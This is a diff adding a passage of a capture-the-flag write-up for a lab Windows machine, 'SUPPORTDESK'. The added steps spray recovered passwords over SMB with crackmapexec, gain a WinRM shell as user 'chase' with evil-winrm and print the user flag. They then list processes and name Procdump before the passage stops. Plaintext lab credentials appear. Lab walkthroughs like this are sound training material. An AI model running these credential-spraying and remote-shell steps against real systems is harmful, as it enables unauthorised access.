@@ -286,11 +286,249 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 1013: SUPPORTDESK\Jason (SidTypeUser)
 
 root@kali:~# 
+*{% endhighlight %}
+
+Now we found additional users.<br>
+Then try to bruteforce the SMB again.
+{% highlight shell %}
+root@kali:~# cat users.txt 
+administrator
+guest
+defaultaccount
+WDAGUtilityAccount
+support
+chase
+jason
+
+root@kali:~#
 {% endhighlight %}
 {% highlight shell %}
+root@kali:~# cat passwords.txt 
+stealth1agent
+$uperP@ssword
+Q4)sJu\Y8qz*A3?d
 
+root@kali:~#
+{% endhighlight %}
+{% highlight shell %}
+root@kali:~# crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt 
+CME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\administrator:stealth1agent STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\administrator:$uperP@ssword STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\guest:stealth1agent STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\guest:$uperP@ssword STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\guest:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\defaultaccount:stealth1agent STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\defaultaccount:$uperP@ssword STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\defaultaccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\WDAGUtilityAccount:stealth1agent STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\WDAGUtilityAccount:$uperP@ssword STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\WDAGUtilityAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\support:stealth1agent STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\support:$uperP@ssword STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\chase:stealth1agent STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\chase:$uperP@ssword STATUS_LOGON_FAILURE 
+CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\chase:Q4)sJu\Y8qz*A3?d 
+[*] KTHXBYE!
+
+root@kali:~#
+*{% endhighlight %}
+
+Now we found additional credential.
+{% highlight shell %}
+chase:Q4)sJu\Y8qz*A3?d
+*{% endhighlight %}
+
+Still we can not use Psexec, but this time we can login via WinRM.<br>
+This time, "<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm"</a>" was used for the user shell as "Chase".
+{% highlight shell %}
+root@kali:~# python impacket/examples/psexec.py 'chase:Q4)sJu\Y8qz*A3?d@10.10.10.149'
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.149.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+
+root@kali:~#
+{% endhighlight %}
+{% highlight shell %}
+root@kali:~# gem install evil-winrm
+
+root@kali:~# evil-winrm -u Chase -p "Q4)sJu\Y8qz*A3?d" -i 10.10.10.149
+
+Evil-WinRM shell v2.0
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Chase\Documents> whoami
+supportdesk\chase
+
+*Evil-WinRM* PS C:\Users\Chase\Documents>
+*{% endhighlight %}
+
+user.txt is in a directory "C:\Users\Chase\Desktop"
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
+a127daef77ab6d9d92008653295f59c4
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop>
 {% endhighlight %}
 
 ### 3. Getting Root
 
+In the directory "C:\Users\Chase\Desktop", we have another text file "todo.txt".
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Chase\Desktop> dir
 
+
+    Directory: C:\Users\Chase\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+-a----        4/22/2019   9:08 AM            121 todo.txt                                                                                                                                                                                                
+-a----        4/22/2019   9:07 AM             32 user.txt                                                                                                                                                                                                
+
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop>
+{% endhighlight %}
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
+Stuff to-do:
+1. Keep checking the issues list.
+2. Fix the router config.
+
+Done:
+1. Restricted access for guest user.
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop>
+{% endhighlight %}
+
+Then, check the running processes.
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Chase\Documents> get-process
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                                    
+-------  ------    -----      -----     ------     --  -- -----------                                                                                                                                                                                    
+    458      18     2404       5512               408   0 csrss                                                                                                                                                                                          
+    295      17     2472       5368               504   1 csrss                                                                                                                                                                                          
+    358      15     3528      14636              4172   1 ctfmon                                                                                                                                                                                         
+    257      14     4152      13588              3948   0 dllhost                                                                                                                                                                                        
+    164       9     1880       9836       0.31   5464   1 dllhost                                                                                                                                                                                        
+    617      32    34112      59008               716   1 dwm                                                                                                                                                                                            
+   1494      58    24008      78864              5488   1 explorer                                                                                                                                                                                       
+    343      19    10164      37648       0.56   1088   1 firefox                                                                                                                                                                                        
+    390      34    63592      95860      85.36   1716   1 firefox                                                                                                                                                                                        
+    358      26    16292      37592       1.00   4296   1 firefox                                                                                                                                                                                        
+    408      31    17404      63240       3.84   4704   1 firefox                                                                                                                                                                                        
+   1121      72   149076     484916      44.81   4968   1 firefox                                                                                                                                                                                        
+     49       6     1440       3732               808   0 fontdrvhost                                                                                                                                                                                    
+     49       6     1796       4748               980   1 fontdrvhost                                                                                                                                                                                    
+      0       0       56          8                 0   0 Idle                                                                                                                                                                                           
+   1009      23     6432      15252               648   0 lsass                                                                                                                                                                                          
+    227      13     3096      10360              4228   0 msdtc                                                                                                                                                                                          
+    570      62   129624     147492              2980   0 MsMpEng                                                                                                                                                                                        
+      0      13      308      52948               104   0 Registry                                                                                                                                                                                       
+    290      15     5304      16412              1952   1 RuntimeBroker                                                                                                                                                                                  
+    275      14     3080      15260              4800   1 RuntimeBroker                                                                                                                                                                                  
+    144       8     1652       7684              5592   1 RuntimeBroker                                                                                                                                                                                  
+    672      32    19940      49180              6064   1 SearchUI                                                                                                                                                                                       
+    542      11     5368       9964               628   0 services                                                                                                                                                                                       
+    683      29    15324      40896              5960   1 ShellExperienceHost                                                                                                                                                                            
+    439      17     4988      24112              4740   1 sihost                                                                                                                                                                                         
+     53       3      524       1216               324   0 smss                                                                                                                                                                                           
+    475      23     5840      16364              2564   0 spoolsv                                                                                                                                                                                        
+    168      11     2508      13208                68   0 svchost                                                                                                                                                                                        
+    203      12     2040       9672               364   0 svchost                                                                                                                                                                                        
+    115       7     1272       5344               480   0 svchost                                                                                                                                                                                        
+    128       7     1256       5720               500   0 svchost                                                                                                                                                                                        
+    284      13     4292      11328               528   0 svchost                                                                                                                                                                                        
+    127       7     1392       6216               668   0 svchost                                                                                                                                                                                        
+    149       9     1720      11720               708   0 svchost                                                                                                                                                                                        
+     85       5      912       3848               764   0 svchost                                                                                                                                                                                        
+    862      20     6984      22608               788   0 svchost                                                                                                                                                                                        
+    866      16     5368      11884               868   0 svchost                                                                                                                                                                                        
+    252      11     2088       7800               920   0 svchost                                                                                                                                                                                        
+    390      13    11184      15124              1064   0 svchost                                                                                                                                                                                        
+    122      15     3652       7704              1172   0 svchost                                                                                                                                                                                        
+    188       9     1836       7616              1220   0 svchost                                                                                                                                                                                        
+    232      12     2456      11064              1228   0 svchost                                                                                                                                                                                        
+    156       7     1240       5684              1240   0 svchost                                                                                                                                                                                        
+    214       9     2200       7520              1248   0 svchost                                                                                                                                                                                        
+    431       9     2952       9120              1260   0 svchost                                                                                                                                                                                        
+    175       9     1524       7256              1272   0 svchost                                                                                                                                                                                        
+    140       7     1320       5744              1372   0 svchost                                                                                                                                                                                        
+    344      15     4360      11612              1424   0 svchost                                                                                                                                                                                        
+    172      11     1848       8096              1436   0 svchost                                                                                                                                                                                        
+    378      17     5036      14284              1444   0 svchost                                                                                                                                                                                        
+    226      13     3104       8448              1552   0 svchost                                                                                                                                                                                        
+    284      12     1900       8024              1560   0 svchost                                                                                                                                                                                        
+    193      13     2208      12100              1632   0 svchost                                                                                                                                                                                        
+    323      10     2668       8516              1640   0 svchost                                                                                                                                                                                        
+    163      10     1968       6712              1780   0 svchost                                                                                                                                                                                        
+    399      31     8732      17152              1864   0 svchost                                                                                                                                                                                        
+    159       9     2196       7556              1916   0 svchost                                                                                                                                                                                        
+    198      11     2008       8212              1932   0 svchost                                                                                                                                                                                        
+    240      11     2568       9916              2060   0 svchost                                                                                                                                                                                        
+    389      19    15116      32160              2216   0 svchost                                                                                                                                                                                        
+    167      11     3912      10908              2636   0 svchost                                                                                                                                                                                        
+    265      13     2564       7868              2640   0 svchost                                                                                                                                                                                        
+    233      25     3404      12620              2652   0 svchost                                                                                                                                                                                        
+    405      16    12968      21976              2664   0 svchost                                                                                                                                                                                        
+    473      20    13512      28352              2672   0 svchost                                                                                                                                                                                        
+    137       9     1652       6596              2700   0 svchost                                                                                                                                                                                        
+    140       8     1512       6184              2776   0 svchost                                                                                                                                                                                        
+    210      11     2556       8532              2800   0 svchost                                                                                                                                                                                        
+    126       7     1224       5396              2816   0 svchost                                                                                                                                                                                        
+    213      12     1896       7532              2852   0 svchost                                                                                                                                                                                        
+    233      14     4756      11896              2920   0 svchost                                                                                                                                                                                        
+    468      18     3444      11752              2988   0 svchost                                                                                                                                                                                        
+    276      28     5352      14288              3020   0 svchost                                                                                                                                                                                        
+    169      10     2164      13324              3040   0 svchost                                                                                                                                                                                        
+    387      24     3444      12360              3236   0 svchost                                                                                                                                                                                        
+    254      13     3560      12716              3260   0 svchost                                                                                                                                                                                        
+    365      18     5600      26880              4020   1 svchost                                                                                                                                                                                        
+    227      11     2880      10960              4512   0 svchost                                                                                                                                                                                        
+    232      12     3068      13548              4768   1 svchost                                                                                                                                                                                        
+    169       9     4324      12040              4820   0 svchost                                                                                                                                                                                        
+    207      11     2912      12072              5116   0 svchost                                                                                                                                                                                        
+    251      14     3192      13840              5208   0 svchost                                                                                                                                                                                        
+    210      15     6416      10652              5424   0 svchost                                                                                                                                                                                        
+    327      16    16024      18288              6580   0 svchost                                                                                                                                                                                        
+    163       9     3104       7664              6688   0 svchost                                                                                                                                                                                        
+    297      20    10704      14752              6788   0 svchost                                                                                                                                                                                        
+   1937       0      192        152                 4   0 System                                                                                                                                                                                         
+    210      21     4548      13204              4184   1 taskhostw                                                                                                                                                                                      
+    298      18     5260      15724              7112   1 taskhostw                                                                                                                                                                                      
+    178      12     3200      10356              2836   0 VGAuthService                                                                                                                                                                                  
+    245      18     3884      15040              1940   1 vmtoolsd                                                                                                                                                                                       
+    384      22     9464      22456              2828   0 vmtoolsd                                                                                                                                                                                       
+    175      11     1508       6860               488   0 wininit                                                                                                                                                                                        
+    286      13     2732      12920               560   1 winlogon                                                                                                                                                                                       
+    344      16    10428      19688              3992   0 WmiPrvSE                                                                                                                                                                                       
+    635      28    51756      66952       0.64   3120   0 wsmprovhost                                                                                                                                                                                    
+    588      27   166464     184692       6.63   5044   0 wsmprovhost                                                                                                                                                                                    
+
+
+*Evil-WinRM* PS C:\Users\Chase\Documents>
+{% endhighlight %}
+
+We can find out even though this is server, Firefox is running.
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Chase\Documents> get-process -name firefox
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                                    
+-------  ------    -----      -----     ------     --  -- -----------                                                                                                                                                                                    
+    343      19    10164      37648       0.56   1088   1 firefox                                                                                                                                                                                        
+    390      34    63644      95964      85.36   1716   1 firefox                                                                                                                                                                                        
+    358      26    16292      37592       1.00   4296   1 firefox                                                                                                                                                                                        
+    408      31    17404      63240       3.84   4704   1 firefox                                                                                                                                                                                        
+   1145      72   148184     484392      44.81   4968   1 firefox                                                                                                                                                                                        
+
+
+*Evil-WinRM* PS C:\Users\Chase\Documents> 
+{% endhighlight %}
+
+To obtain information from the process, we can use a tool <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>
